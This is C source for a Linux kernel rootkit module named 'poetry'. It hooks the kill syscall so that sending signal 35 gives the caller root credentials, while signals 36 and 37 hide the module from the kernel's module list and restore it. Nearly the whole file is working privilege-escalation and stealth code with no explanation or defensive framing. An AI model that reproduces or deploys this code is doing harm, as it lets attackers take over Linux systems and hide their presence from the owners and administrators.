static struct list_head *prev_module;
static short hidden = 0;
extern int debug;

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
}


static asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage int hook_kill(const struct pt_regs *regs)
{

    int sig = regs->si;

    switch (sig)
    {
    case 35:
        if (debug == 1)
        {
            printk(KERN_INFO "poetry: giving root\n");
        }
        
        set_root();
        return 0;
    case 36:
        if (debug == 1)
        {
            printk(KERN_INFO "poetry: hiding\n");
        }
        
        hideme();
        return 0;
    case 37:
        if (debug == 1)
        {
            printk(KERN_INFO "poetry: unhiding\n");
        }
        
        showme();
        return 0;
    }

    return orig_kill(regs);

}
